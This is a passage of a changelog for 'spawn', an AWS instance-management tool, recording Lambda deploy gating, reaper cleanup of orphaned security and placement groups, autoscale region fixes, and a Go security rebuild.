# Changelog

All notable changes to **spawn** are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **Every Lambda template parameter is now gated as actually passed by its
  deploy** (#776). A parameter declared in a template but never passed takes its
  **default** on every deploy, and an operator supplying it on the command line
  is ignored without a word — a silent substitution, not a crash.
  `lambda/ttl-reaper` had its own version of this check and it earned its keep by
  catching `LogRetentionDays` wired into none of three templates (#770).
  `autoscale-orchestrator` and `pipeline-orchestrator` had **no tests at all**,
  so when `ScheduleState` was added (#772) nothing would have noticed if it had
  been forgotten.
  Now **one** test over `lambda/*/`, accepting both deploy styles in this repo
  (the `PARAM_MAP` merge file and inline `--parameter-overrides`). One rather
  than a copy per module, because a per-module check cannot cover the module
  nobody added one to — which is exactly how this gap existed.
  Its first run deleted a parameter rather than classifying it: `ScheduleRate`
  had been added hours earlier and **could not be passed at all**, because
  `--parameter-overrides` cannot carry a value containing a space and every valid
  EventBridge rate has one. A parameter the supported deploy path cannot set
  advertises configurability that does not exist — the same defect as #774's
  ignored `--region` — so the rate is hardcoded again, with the reason recorded
  at the property.

- **The autoscale reconciliation schedule is now a deploy-time parameter**
  (#772). `ScheduleState` (ENABLED/DISABLED, default **ENABLED**) and
  `ScheduleRate` (default `rate(1 minute)`) make the schedule changeable through
  CloudFormation, which is the only safe way: the rule is CFN-managed
  (`AutoScaleOrchestratorFunctionScheduleEvent`), so `aws events disable-rule`
  would be stack drift and would be **silently reverted by the next deploy** —
  the same trap as #754's `update-function-code`. `make deploy
  SCHEDULE_STATE=DISABLED` does it properly.
  Defaults are unchanged, so this is a no-op until someone chooses otherwise.
  The template documents a trap worth knowing: SAM's `Enabled: !Ref <param>`
  **silently does not work.** It resolves as
  `"ENABLED" if self.Enabled else "DISABLED"`, and at transform time a `!Ref` is
  an intrinsic dict — always truthy — so every value including `'false'` yields
  `ENABLED`, and `sam validate --lint` accepts it. Verified by running SAM's own
  translator locally: the `Enabled` form produced a hardcoded `ENABLED` for a
  parameter set to `DISABLED`. `State` is passed through verbatim and is the
  correct spelling.

- **`spawn autoscale` now reports whether anything will actually act on a group**
  (#772). `autoscale launch` and `add-schedule` write into the group's DynamoDB
  record; a *scheduled* Lambda reads those records and acts. Nothing in the CLI
  referenced that schedule, so the two halves could come apart silently — every
  command reporting success while the group sat inert, with nothing saying why.
  That is why the two per-minute rules in #772 could not simply be switched off:
  a thing that cannot be observed cannot safely be turned off.
  `autoscale status` and `autoscale launch` now warn when coverage is missing,
  and distinguish **four** states rather than collapsing them: covered;
  orchestrator deployed but its schedule `DISABLED` (naming the rule and the
  `aws events enable-rule` to fix it); deployed but nothing invokes it; and
  absent. A probe that could not complete says *"could not determine"* instead of
  claiming an absence — the #624 lesson, where a check that warned in every
  account carried no information.
  `autoscale launch`'s "Instances will launch on next scheduled run (within 1
  minute)" is now conditional. It was unconditionally false with the schedule
  disabled, and the immediate trigger does not rescue it: invoking the function
  directly succeeds whether or not a rule is enabled, so a disabled schedule
  reconciles exactly once at creation and then never again.
  The warning also names the region it looked in, because `spawn autoscale`
  resolves its config from the ambient AWS chain and **ignores `--region`** — so
  without `AWS_REGION` set it probed us-west-2 and confidently reported no
  orchestrator in an account that has one. The region handling is a separate
  pre-existing defect; naming the region makes that false negative
  self-diagnosing in the meantime.

- **`spawn footprint` — a report of everything spawn has created, including the
  control plane** (#653). `spawn orphans` covers the *data* plane: volumes,
  security groups, placement groups, Elastic IPs. Nothing covered the Lambdas,
  their log groups and execution roles, EventBridge schedules, state tables, and
  auto-created buckets — the TTL reaper is the backstop for instances, and
  nothing is the backstop for the reaper.
  It **never deletes**; it is a report, and a Tier 0 test pins that by launching
  an instance and confirming it survives.
  Rows are found two ways and each says which: `tag` (the authoritative
  `spawn:managed`, reusing the same discovery path `resources` and `cleanup` use)
  and `name` (needed because most of the control plane predates being tagged).
  Log groups report their retention, and a log group whose Lambda no longer
  exists is flagged — deleting a function does *not* delete its log group, which
  `/aws/lambda/github-oauth-bridge` demonstrated by outliving the function it
  belonged to.
  An empty result says what was searched for rather than implying a clean
  account, which is the #708 lesson, and the help text states the name half's
  blind spot outright: one live Lambda is called `scheduler-handler`, with no
  prefix at all. On its first run against the infra account it reported **109
  resources** — including 23 DynamoDB tables and 5 EventBridge rules that no
  earlier inventory had mentioned.

- **Lambda log groups now have a bounded retention, and CI gates that every
  deploy path sets one** (#653). A footprint audit measured the actual control
  plane rather than assuming: **10 log groups with no retention at all, holding
  51 MB** — the only artifact measured to grow without bound. A log group that
  Lambda auto-creates on first invocation keeps logs *forever* by default, and
  only the four declared by a SAM template had a retention, which is exactly why
  the script-deployed functions were among the ten.
  All six deploy paths now set it: the three SAM templates take a
  `LogRetentionDays` parameter (default **30**, matching what they previously
  hardcoded), and the three shell deploys call `aws logs put-retention-policy`,
  overridable with `LOG_RETENTION_DAYS`. `make lambda-versions` — now
  `scripts/lambda-deploy-census.sh`, since it checks more than versions — fails a
  PR whose deploy path omits either a `spawn:version` stamp or a retention.
  Nothing is applied to existing log groups by this change: setting retention
  deletes logs older than the window, so the ten outliers are left for a
  deliberate operator decision.
  Also corrects two priorities on #653 with measurements: the `spawn-results-*`
  bucket it called "arguably the biggest real cost today" holds **83 KB** across
  182 objects since July, and the account has **21** `spawn*`/`spore*` buckets
  rather than the two the issue listed — including 11 regional
  `spawn-binaries-*`.

- **Every spore.host-operated Lambda now stamps the version it was deployed
  from, and CI gates that it does** (#654). Nothing synchronises the CLI with the
  control plane — `spawn` upgrades when a user upgrades it, a Lambda only when
  someone runs its deploy — so version skew is the *normal* state. That is
  defensible, since the two are deployed independently; what was not is that it
  was **invisible**. `spawn-ttl-reaper-production` sat untouched from 2026-07-31
  to 2026-10-04 while the CLI went from ~v0.9x to v0.116.0, missing three merged
  fixes, with nothing anywhere saying so.
  All six deploy mechanisms now set a `spawn:version` tag readable in one API
  call without invoking the function, matching what `spawn reaper deploy` already
  did for the self-hosted reaper: three SAM templates take a `Version` parameter,
  and three shell deploys call `aws lambda tag-resource`. The value comes from
  `git describe --tags --always --dirty`, so a deploy from an uncommitted tree
  stamps `-dirty` and says so rather than claiming a release.
  `make lambda-versions` gates PRs offline — a new Lambda cannot arrive
  unreadable — and `make lambda-versions-deployed` reports live versions for an
  operator. Replaces comparing a function's `LastModified` against
  `git log -- lambda/<name>/`, which is archaeology and is wrong whenever a
  redeploy carried no source change, or a source change was never deployed.

## [0.126.1] - 2026-10-09

### Security

- **Rebuilt against Go 1.26.9 and `golang.org/x/net` v0.60.0** for the batch of
  Go vulnerabilities disclosed 2026-10-09: GO-2026-6605, 6607, 6608, 6610, 6611,
  6612, 6613 and 6617, spanning `net/http`, `crypto/tls`, `mime/multipart`,
  `net/http/httputil`, `net/textproto` and x/net's HTTP/2 implementation.
  The CI Go pin moves 1.26.8 → 1.26.9 in all three workflows, and x/net
  0.58.0 → 0.60.0 in the root module and all three Lambda modules that require it
  (the other nine nested modules are re-tidied, because a module with a
  `replace ../..` pins its own copy of the root's dependencies and otherwise
  fails with "updates to go.mod needed").
  **v0.126.0's published binaries predate the fix** — they were built against Go
  1.26.8 with x/net 0.58.0. The disclosure landed in a three-hour window after
  that release was cut: spawn's vulnerability scan passed at 21:32Z and failed at
  00:41Z with no change but 22 lines of shell comments in a test script.

## [0.126.0] - 2026-10-08

### Changed

- **BREAKING (`pkg/taskproto`): the three script generators now take a
  `WrapperOptions` struct and return an error** (#764, split from #679).
  `GenerateWrapper`, `GeneratePooledJobScript` and `GenerateFlushScript` had four
  positional parameters between them, two of which — `gpu` and `runID` — were
  added in separate releases, one of them in a PATCH. Both are per-launch
  decisions with no safe default, and both have a zero value that compiles and
  looks deliberate: the quickest way to make a consumer build again was
  `GenerateWrapper(spec, bucket, region, false, "")`, which passed every test
  while emitting an empty `run_id` and dropping `--gpus all` — #608 and #606
  reintroduced by a padding edit.
  A struct alone would make that *worse*, since an omitted field is silence where
  a new positional parameter is at least a compile error. So the options carry
  `Validate`, and the generators return `ErrMissingRunID` /
  `ErrMissingResultsPrefix` rather than a script — a loud failure at the point of
  misuse instead of an unattributable S3 record found weeks later. `Region` is
  deliberately *not* required: it is used only for a private-registry ECR login,
  so a host-command task legitimately has none.
  **Migration** is mechanical —
  `GenerateWrapper(spec, prefix, region, gpu, runID)` becomes
  `GenerateWrapper(spec, taskproto.WrapperOptions{ResultsPrefix: prefix, Region: region, RunID: runID, GPU: gpu})`
  plus an error check. There is no positional shim: it would preserve the exact
  hazard being removed, and there is one external caller. The next per-launch
  input is now a non-breaking addition for all three.

### Added

- **`spawn logs <name>` — a spore's log, including after it has terminated.**
  While the instance is alive it tails the log directly over SSH-or-SSM, the same
  path `spawn array logs` uses and sharing its `--which command|spored` and
  `--lines` flags. Once the instance is **gone** that is impossible, so it reads
  back the command-log tail `spored` wrote to the serial console before dying
  (#736) — which means "why did my job fail?" is answerable without knowing that
  `ec2 get-console-output` exists, or that the log was ever on the console.
  The framing `spored` writes is a parsed delimiter, not decoration, so the
  output is the 50 relevant lines rather than the 40 KB of UEFI and cloud-init
  around them. `--console` prints the whole dump instead, for failures that
  happened before the workload started and are explained by the boot messages.
  An absent log is reported as one of **two different things**, because they send
  you in opposite directions: the capture takes about five minutes to appear
  after termination, so a recent instance gets "try again shortly" while an older
  one gets "`spored` only writes this when the workload failed". Distinguished by
  the termination time EC2 embeds in `StateTransitionReason`; when that is absent
  the hint is withheld rather than guessed, since a confidently wrong "try again"
  is worse than none.
  The failure paths now point at it, so the verb does not have to be known in
  advance: both `no instance found with name: …` and `terminate`'s
  "nothing to terminate" add `Its log may still be readable: spawn logs <name>`.
  Those are the two places someone lands when asking "why did it vanish?".
  Dumps are cached under `~/.spawn/cache/console` for **7 days** and pruned on
  every invocation — no daemon, and the cache cannot outlive its own policy.
  Seven days rather than matching the existing 6h `indexCacheTTL`: a diagnostic
  does not go stale the way a package index does, and 6h would expire it *before
  its source*, since AWS served console output for instances `DescribeInstances`
  had entirely forgotten more than twelve hours later. A cache that expires
  before its source teaches you not to trust it. An empty dump is never cached,
  so "no log yet" is not pinned for a week.

- **A gate on the exported API that other repos compile against** (#679).
  `pkg/aws`, `pkg/launcher`, `pkg/taskproto`, `pkg/ecrref`, `pkg/launchererr`,
  `pkg/taskcohort`, `pkg/taskpool` and `pkg/storage` are imported by
  spore-host-mcp, lagotto and calque, so re-shaping an exported symbol in them is
  a change to someone else's build. Nothing here knew that, which is how
  `taskproto.GenerateWrapper` gained a parameter in **v0.111.1 — a PATCH
  release** — and the first sign of it was a Dependabot bump sitting red for six
  days in a different repository, with nothing linking it back.
  `api/public-surface.txt` is now a committed snapshot of that surface, and CI
  fails when it drifts, reporting whether what changed was an **addition**
  (backward-compatible) or a **removal or signature change** (not safe in a
  PATCH; pre-1.0 that bumps MINOR). Intended changes are made visible rather than
  blocked: run `make api-snapshot` and commit the result in the same PR.
  The eight packages are also now named in `CLAUDE.md`, with a second gate
  keeping that table and the one CI reads from drifting apart.

### Fixed

- **The autoscale coverage check warned about the wrong environment** (#772). It
  matched orchestrators by name *prefix* and reported whichever the API returned
  first, so once staging's schedule was disabled a user working in **production**
  was warned that staging was DISABLED — about an environment they were not
  using, while production was healthy. It now matches the exact function for the
  `--env` being operated on, and an absent result names the function it looked
  for as well as the region. A warning about the wrong thing is the #624
  cry-wolf failure, reintroduced by the check written to prevent it.
  Also: `ScheduleRate` is no longer passed via `--parameter-overrides`. That form
  cannot carry a value containing a space, and every valid EventBridge rate has
  one — it failed a real staging deploy with `Parameter ScheduleExpression is not
  valid` and rolled the stack back. The trap is documented in the Makefile, which
  is where the ttl-reaper one already records it.

- **`spawn autoscale` honours `--region` instead of silently ignoring it**
  (#774). The root `--region` flag — whose help says it "overrides
  SPORE_REGION/AWS_REGION and the shared config" — overrode nothing: every
  autoscale call site built its AWS config with a bare
  `config.LoadDefaultConfig(ctx)`, taking the region from the ambient chain. It
  was ignored in *both* directions, with `AWS_REGION` winning even when
  `--region` contradicted it.
  The symptoms: the groups listing failed with `ResourceNotFoundException` in any
  region without a groups table; `autoscale health` reported a healthy group as
  having no instances; and **`autoscale terminate` would find nothing to
  terminate and report success while the instances kept billing**. It also made
  #772's new coverage check report "no autoscale orchestrator runs in this
  account" against an account that has one.
  All **four** call sites now route through one resolver, which fixes the shared
  *profile* they also ignored and uses the same precedence as every other command
  (explicit region > shared config > ambient). Two of the four were found by the
  new gate, not by me — `autoscale health` and `autoscale terminate` both had
  `cfg, _ := config.LoadDefaultConfig(ctx)`, discarding the error as well.

- **Three `pipeline-orchestrator` Makefile targets named a Lambda that does not
  exist** (#754). `make update-code`, `make logs` and `make invoke-test` all
  asked for `spawn-pipeline-orchestrator-production`, but `template.yaml` sets
  `FunctionName: spawn-pipeline-orchestrator` with no environment suffix — so
  none of the three had ever worked, each failing on the name instead of doing
  anything. `Environment` names the *stack*, never the function. The name now has
  a single definition at the top of the Makefile so the two cannot drift again,
  and `update-code` warns that it is a debug shortcut whose effect the next
  `make deploy` silently reverts, since CloudFormation treats the S3 object
  pinned in the template as the truth.
  Also removes `lambda/pipeline-orchestrator/packaged.yaml`, a superseded May
  build artifact that nothing references — `make deploy` uses `--resolve-s3` and
  repackages every time — and which read like a deploy input.

- **MPI rank 0 now waits for every peer to accept SSH, instead of sleeping ten
  seconds and hoping** (#752). The generated MPI script already waited — bounded,
  with a named failure — for the peers file, then built the hostfile. It then
  slept a bare `sleep 10` before `mpirun`, with no comment.
  The peers file existing means the **controller** resolved every peer's IP. It
  says nothing about whether a peer's `sshd` is accepting connections, or whether
  rank 0's public key has reached that peer's `authorized_keys` — which is what
  `pkg/mpicohort/assembler.go` actually distributes, and what `mpirun` needs,
  because it SSHes to every host in the hostfile. So the pad was a race, and one
  that **worsens with cohort size**: a constant wait against a growing number of
  peers that must all be ready.
  Replaced with a bounded poll requiring a successful non-interactive SSH to every
  host in the hostfile. `BatchMode=yes` is load-bearing — it tests `sshd` **and**
  `authorized_keys` together, where a port probe would pass while MPI still
  failed. Capped at 600s with a `SPAWN_COMPLETE` failure record, matching the
  peers-file wait above it, so a broken peer produces a named cause rather than
  an opaque `mpirun` error about an unreachable host. A healthy cohort now starts
  as soon as its peers are ready instead of always paying ten seconds.
  Verified on real hardware at **4 nodes** (`NODES=4 scripts/hardware-smoke.sh`):
  all 4 nodes, 8 ranks, clean teardown with no leaked instances, placement groups
  or security groups.
- **The hardware smoke no longer guesses how long `mpirun` takes.** Its MPI
  assertion slept a flat 45s before grepping rank 0's log for the per-node lines.
  That became a worse bet with the change above — rank 0's `mpirun` no longer
  starts at a fixed offset, and the wait needed grows with `NODES` while a
  constant does not. It now polls until the rank count reaches `NODES` or a
  deadline passes, and reports which. At 4 nodes the poll found all of them in
  **10s**, where the old constant would have spent 45.
- **A failed `--command` job no longer takes its only diagnostic with it**
  (#736). When a workload failed and the instance self-terminated,
  `/var/log/spawn-command.log` went with it: the exit code survived in a tag, the
  *reason* did not. From outside, "the job failed" and "the job failed because the
  package install 404'd" were the same event.
  `spored` now copies the **last 50 lines** of that log to the serial console
  before terminating, on a **failed** outcome only. It survives the instance —
  measured: a userspace write to `/dev/console` does appear in
  `ec2 get-console-output`, and that output outlives the instance's visibility in
  `describe-instances` by hours. Read it with
  `aws ec2 get-console-output --instance-id <id>`.
  **Allow about five minutes** after termination before reading: the
  post-termination capture is not immediate, and before it populates the API
  returns nothing at all rather than a partial result. Also measured, and it is
  why the log line says so — an immediate read looks exactly like a missing log.
  Fifty lines is a budget rather than a guess. Console output is capped around
  64 KB and a baseline boot already consumes 13-17 KB of it, so copying a whole
  log would evict the cloud-init messages that are *also* diagnostic, and those
  are what explain a boot-time failure.
  Chosen over uploading to S3 because it needs no bucket, no IAM grant and no new
  write path, so it does not enlarge the un-reaped `spawn-results-*` footprint on
  every launch. The task path keeps its existing S3 flush
  (`pkg/taskproto/flush.go`), unaffected.
  A no-op on Windows and on dev builds, where `/dev/console` does not exist. The
  gate is the completion record `spored` was already reading just to log it, so a
  successful job writes nothing and no new plumbing was needed; an unparseable,
  truncated or absent record means "not a failure", because this runs on a
  teardown path and must never interfere with it.

- **Ctrl-C was ignored for up to five minutes while waiting on an instance**
  (#752's last item). Six polls in `cmd/` had no `ctx.Done()` case at all, so a
  cancelled context did nothing until the loop's own iteration count ran out.
  Three of them — `spawn connect` (twice) and `spawn start`/`spawn stop`'s
  post-start wait — also hand-rolled a *wait for running* that
  `pkg/aws.Client.WaitForRunning` already does properly: it wraps the SDK's
  instance-running waiter and absorbs the #78 `InvalidInstanceID.NotFound`
  window. The hand-rolled versions polled a **whole-region** `DescribeInstances`
  every few seconds — cost scaling with fleet size — and slept *before* the first
  check, charging 2–5s to an instance that was already running.
  All three now call `WaitForRunning` plus **one** refresh. A new
  `WaitForPublicIP` covers the case `spawn start` actually needs, since a
  stop/start reassigns the address and the IP is often unpopulated the instant
  state flips to `running` — mirroring `WaitForPasswordData`'s shape, which is
  this package's canonical poll.
  `spawn start` also silently swallowed an API error: a failed `ListInstances`
  `break`ed out of the loop and reported "taking longer than expected", which is
  not what had happened.
- **`spawn connect` to a DCV session no longer spins to a five-minute timeout on
  a named failure.** Its ready-url poll duplicated the tag parsing by hand and so
  lacked the terminal-failure detection `spawn app` has, meaning a *known* cause
  — DCV not installed, server not running, a tag-write denial — produced a
  generic timeout instead of the specific message (#282). It now shares
  `scanDCVReady` and `dcvFailureMessage` with `spawn app`.

- **A failed `spored` install hung a burst instance's boot forever** (#752).
  `spawn burst`'s generated user-data waited with
  `while [ ! -f /usr/local/bin/spored ]; do sleep 5; done` — unbounded, with no
  failure path. A bad download, a checksum mismatch, the wrong architecture or no
  network produced a silent hang with no output and no completion record.
  That is worse than an ordinary hang: an instance with no `spored` has **no TTL,
  idle or cost enforcement in-instance** (#50), so a hung boot is also an
  unbounded bill. Now capped at 300s with a non-zero exit that names cloud-init
  and warns that the instance is unprotected — matching `pkg/userdata/queue.go`,
  which caps the identical wait and sits 20 lines from where this was copied from.
  A test now scans every Go file that embeds shell for an unbounded wait, since
  these scripts live in string literals and no shell linter ever sees them.
- **IAM eventual consistency is now waited out by polling, not by a blind sleep**
  (#752), in three places.
  `pkg/aws/iam.go` slept a flat 10 seconds after attaching a role to an instance
  profile — while `waitForInstanceProfile`, **830 lines below in the same file**,
  exists precisely to replace it and says so: it "returns as soon as the profile
  is readable … instead of a blind fixed sleep". The statement immediately after
  the sleep was already `GetInstanceProfile`, i.e. the readiness probe. The sleep
  also ignored `ctx`, so a Ctrl-C during it did nothing.
  `scripts/setup-spawnd-iam-role.sh` slept 10s after
  `add-role-to-instance-profile`; it now polls until the **role appears in the
  profile**, which is the condition EC2 actually needs at `RunInstances` — not
  merely that the profile exists.
  `scripts/deploy-custom-dns.sh` slept 3s after `create-role` and then ran a bare
  `get-role` with no retry and no failure check, so a slow propagation left
  `ROLE_ARN` **empty** and the script created a Lambda with an empty role — a
  failure surfacing far from its cause. It now retries the read and refuses to
  continue without an ARN.
- **The hardware smoke's leak check could report "no instances left behind" for a
  terminate that had hung** (#752). It slept 10s and then queried
  `pending,running,stopping,stopped` — omitting `shutting-down`, the same blind
  spot as #736. So the sleep bought nothing: a still-terminating instance was
  invisible with or without it, while a genuinely *failed* terminate leaves state
  `running` and was caught instantly. The two outcomes were indistinguishable.
  It now polls until the live set is empty, with `shutting-down` included, so
  "still shutting down" and "stuck" are different answers. Cost control is
  existential here, which is exactly why the check has to be able to tell them
  apart.
- **Orphaned security groups and placement groups were permanently
  uncollectable** — the creation stamp the reaper depends on was never written by
  anything. `spawn:created` was read in three places and written in **none**, so
  the reaper's net-resource sweep (#685) skipped every resource it found, by
  design:
  > No creation stamp. Skipped rather than guessed: an untimed group could be
  > seconds old, and deleting a group a launch is about to use would break that
  > launch.
  That reasoning is right in isolation. Combined with no writer — and with the
  creating Lambda's cleanup goroutine being frozen by the runtime (#752) — the two
  safety properties composed into a leak with **no collector**: the creator could
  not delete them and the reaper would not. A live sweep found **21 such security
  groups across three regions**, every one with zero network interfaces and
  `spawn:managed=true`, which is essentially the entire set #685 first reported,
  still present months after the reaper shipped.
  All seven network-resource creation sites now tag through a single
  `pkg/aws.LifecycleTags`, which always emits `spawn:managed` and `spawn:created`.
  Two of those sites — the pipeline orchestrator's security group and placement
  group — previously carried **no `spawn:managed` tag at all**, so the reaper was
  not even permitted to touch them; its delete grants are conditioned on exactly
  that tag.
  A test now requires every raw `CreateSecurityGroup`/`CreatePlacementGroup` call
  to tag through that helper, because six hand-rolled tag slices is how the stamp
  came to be missing from all of them.
- **The reaper can now reclaim an untagged orphan instead of skipping it
  forever.** A spawn-managed resource with no creation stamp is stamped with a
  `spawn:reaper-first-seen` time on first sight and aged out against a **30-day**
  fallback — four times the normal grace, because the discovery time is a lower
  bound on the real age rather than the age itself.
  Deliberately a separate tag from `spawn:created`: backfilling that would claim
  the resource was created when we noticed it, which is false, and would hide the
  fact that some creation path is not tagging. `report` mode still writes nothing,
  since a mode that claims to change nothing should not mutate tags either, and a
  failed stamp is non-fatal — the resource is simply re-stamped next cycle.
  This needed `ec2:CreateTags`, tag-conditioned on `spawn:managed=true` so the
  reaper can stamp only what is already ours and cannot adopt a resource by
  tagging it. **#685's IAM parity gate caught the grant being added to the
  scan-self policy and not the cross-account role** — a one-sided grant that would
  have worked in one deployment mode and silently no-opped in the other.

## [0.125.0] - 2026-10-08

### Added

- **The reaper now reclaims orphaned security groups and placement groups** (#685's
  remaining half). The ordering and race bugs were fixed in v0.121.0 and discovery
  was added to `spawn orphans`/`cleanup`, but nothing reclaimed these without
  someone running a command: 19 security groups and 9 placement groups were found in
  one region of one account, the oldest three months old.
  Reclaimed after **7 days** with no instance referencing them. The grace is a
  policy choice, not a technical one: the MPI security group is keyed on
  `spawn-mpi-<job-array-name>` and reused *by name* across runs, so a short grace
  would force a recreate on every repeat run of a named array. A week makes a weekly
  re-run free, and a recreate is cheap anyway since #659 already backfills rules onto
  an existing group. Neither resource costs money — the pressure is the per-VPC
  quota, which bites at launch time, the worst moment to discover it.
  Membership is asked of EC2 rather than inferred from spawn's own instances, because
  **any** member blocks the delete, including one spawn did not create. A resource
  with no creation tag is **skipped rather than assumed old**: neither describe call
  returns a creation time, so spawn's tag is the only source, and an untimed group
  could be seconds from use by a launch in flight. `DependencyViolation` is tolerated
  rather than alarmed on — a group can be referenced by another group's rule or an
  ENI, which the instance scan cannot see — and the next cycle retries.
  The four new IAM actions are **simulated in both directions**, not merely applied:
  deleting a `spawn:managed=true` resource is allowed, an untagged or
  `spawn:managed=false` one is `implicitDeny`, and `ec2:DeleteVpc`,
  `ec2:DeleteSubnet` and `iam:DeleteRole` remain denied so the blast radius is
  unchanged. Both the scan-self policy and the CloudFormation cross-account role
  carry them — the latter caught by a parity gate, and it is the **production**
  configuration, where a one-sided grant would make the feature silently no-op.
  **Reclamation is off by default and staged**, via a new `REAPER_NET_RESOURCES` /
  `NetResources` setting with three values rather than a boolean. It is
  deliberately **not** folded into `DryRun`: production runs with the dry run
  **off**, so a boolean would have armed a brand-new destructive sweep the moment
  the Lambda was updated, and the only way to preview it would have been to turn
  off the **live instance reaper** — trading an untested delete for a disarmed TTL
  backstop. `report` (the default) logs what it would reclaim and deletes nothing,
  so an upgrade is observable but inert; `reap` deletes, once the report has been
  read; `off` skips the sweep entirely. An unrecognised value resolves to
  `report`, because a typo in a stack parameter must not arm a delete, and
  `DryRun` still wins over everything. Same reasoning as `DnsExpire`, which this
  follows deliberately.
  A new test also requires every template parameter to appear in the deploy
  Makefile's map: a parameter the tooling cannot set is reachable only by
  hand-editing the stack, which is the state that machinery exists to prevent.
- **The reaper now reports when `spored` has stopped checking in** (#682). A running
  instance whose agent has died enforces none of its own limits: TTL, idle-stop and
  cost are all applied *in* the instance, so when the loop stops, the only thing
  left that will ever terminate the box is the reaper's deadline scan. Until now
  that condition was invisible — "spored is dead" looked exactly like "the job is
  still running". The reported case was a 0.5 GiB instance wedged during a package
  install, still billing at **twice** its 6-minute TTL with no completion record and
  no signal of any kind, until a human noticed.
  No new producer and no new storage were needed: `spored` has written
  `spawn:last-heartbeat` on every tick since #497 — described there as "an always-on
  liveness signal a caller can poll" — and a search of the tree found **zero**
  consumers. The gap was a reader, so this adds one. Each cycle now counts every
  managed instance as heartbeat-fresh, -stale or -unknown in the run summary, and a
  stale one logs the `SPORED NOT CHECKING IN` sentinel naming the instance, account,
  region and how far behind it is, with a matching CloudWatch metric filter and
  alarm (three consecutive hourly runs, so one lost tag write pages nobody).
  A missing tag is **unknown, not stale** — an instance pre-first-tick, or one
  launched by something that installs no agent at all, such as a detached sweep row
  (#725); a missing signal and a lapsed one mean different things and only one is a
  symptom. An unparseable stamp is likewise unknown, since that is evidence of a
  format change rather than a dead agent, and reporting it as a death would cry wolf
  every cycle until someone found the real cause.
  Deliberately **not** a reap trigger. A stale heartbeat is a diagnosis, not a
  deadline: `spawn:ttl-deadline` and the max-age ceiling remain the only
  authorities, because an agent wedged while its workload runs fine would otherwise
  have its work destroyed to tidy a symptom. v0.121.0's memory-floor warning is the
  preventive half of #682; this is the part that makes it observable when the
  instance gets starved anyway.
  Every sentinel string is now also required to have a CloudWatch metric filter in
  the template, by test. A sentinel wired to nothing is indistinguishable from no
  sentinel — which is the same defect as the heartbeat tag itself.

### Fixed

- **Two Lambda orchestrators never deleted the placement groups and security
  groups they created** (#752). `cleanupPlacementGroup` opened with
  `time.Sleep(30 * time.Second)` and was started with `go` immediately before
  `return nil` at **all four** of its call sites. A Lambda **freezes its
  execution environment when the handler returns**, so that goroutine never
  resumed — the delete simply never happened, at every site, for the life of the
  feature. `pipeline-orchestrator` had the identical shape twice, around
  `DeleteSecurityGroup` and `DeletePlacementGroup`.
  This is a second and previously unidentified mechanism behind #685, which found
  **nine orphaned placement groups and nineteen security groups** in one region of
  one account and was diagnosed as a CLI-side ordering bug. Neither resource bills
  directly; the cost is per-VPC quota, which bites at **launch** time.
  All six sites are now synchronous, and they use the retry policy `pkg/aws`
  already owns — now exported as `RetryPlacementGroupDelete` for callers holding a
  raw `*ec2.Client`, which the cross-account orchestrators do. A flat 30-second
  wait was the wrong tool regardless: `TerminateInstances` is asynchronous with no
  fixed duration, so it is a race in one direction and dead time in the other.
  The shared policy retries **only** `InvalidPlacementGroup.InUse` against a
  60-second budget, so a permissions error surfaces at once instead of being
  re-learned twelve times.
  Guarded by a test that scans both Lambdas for a `go` starting anything that
  sleeps — resolving **named** functions, not just inline closures, because the
  real bug's sleep sat 1200 lines from its call site and a "sleep near the `go`"
  check could not see it.
- **A detached parameter sweep launched zero instances and reported success**
  (#749). The orchestrator Lambda never sees a `LaunchConfig` — it reads param
  keys out of the uploaded `params.json` and builds `RunInstances` from them —
  and the CLI never seeded `ami`. So every row was rejected with
  `MissingParameter: The request must contain the parameter ImageId`, the Lambda
  logged "All instances launched and completed", and the CLI printed "Parameter
  sweep queued successfully" and exited 0. **Detached is the default for
  parameter sweeps**, so the default path created nothing for the entire life of
  the feature. `key_name` and `spot` were silently dropped by the same gap.
  This is #697's class again, on the one path #697 explicitly scoped itself out
  of. The codebase even documented the cause — "only the foreground path detects
  an AMI per config" appears as a reason to prefer `--no-detach` for heterogeneous
  sweeps — without anyone noticing it meant the detached path resolved *no* AMI.
  The AMI is now resolved **per row**, not as one sweep-wide default:
  `GetRecommendedAMI` keys off architecture and GPU, so a single default would
  force one row's AMI onto all of them and an arm64 AMI on an x86 row does not
  boot (#372). Memoized by `(region, arch, gpu)`, so fifty rows over three
  families make three lookups. A resolve failure is **fatal** rather than a
  warning, because continuing would upload a row with no `ami` — which is the bug.
  An unset flag leaves its key **absent** rather than writing `""`:
  `RunInstances` rejects an empty `KeyName` outright, and the Lambda's own
  `iam_role` fallback would be defeated by an empty string. Precedence is
  unchanged — a row's own key beats the CLI flag, which beats the file's defaults.
- **The sweep orchestrator no longer records a total failure as a success**
  (#749). A finished sweep that launched **zero** of N instances is now `FAILED`.
  `state.Failed` was already being counted; the completion branch simply never
  consulted it, and set `COMPLETED` unconditionally. A cost-control tool reporting
  a launch that did not happen is the same failure class as #737, where declining
  a terminate exited 0. A *partial* failure deliberately stays `COMPLETED` — the
  sweep did run, per-row error messages are in the record, and a third status
  value would send `cancel`, `resume` and six workflow adapters down a default
  branch. `FAILED` is an existing value, so nothing receives a novel one.
  **Takes effect only after the Lambda is redeployed**; the rest of this fix
  ships with the CLI binary.
- **`spawn launch` no longer promises a detached sweep is running when it cannot
  know.** "The sweep is now running in Lambda. You can disconnect safely" was
  unsupportable: the CLI's only evidence is that the Lambda was *invoked*. It now
  says that plainly and points at `spawn status --sweep-id`.

- **A just-terminated instance was reported as if it had never existed** (#736).
  `spawn status chem-arm`, run immediately after that instance's job failed and
  it self-terminated, answered `no instance found with name: chem-arm` — accurate,
  and the wrong answer to the question being asked, which was *why it vanished*.
  `resolveInstance` lists with the default state filter, which is
  pending/running/stopping/stopped, so `terminated` **and `shutting-down`** are
  both invisible. EC2 keeps terminated instances in `DescribeInstances` for about
  an hour with a `StateTransitionReason` ("User initiated",
  "Client.InstanceInitiatedShutdown", a spot reclaim), so the answer was already
  available and simply not requested.
  A not-found name or ID is now checked once more against every state, and when a
  recently-gone instance matches, the message names it:
  `no instance found with name: chem-arm — chem-arm (i-abc) is terminated:
  Client.InstanceInitiatedShutdown`. `spawn terminate` uses it too, so its
  idempotent success path now says `Nothing to terminate — web (i-abc) is
  shutting-down: User initiated` instead of `No instance "web" exists`, which was
  false. Running and stopped instances deliberately produce nothing, since those
  would have been found by the normal lookup.
  This also explains some dead code: `terminate`'s `"Instance %s is already
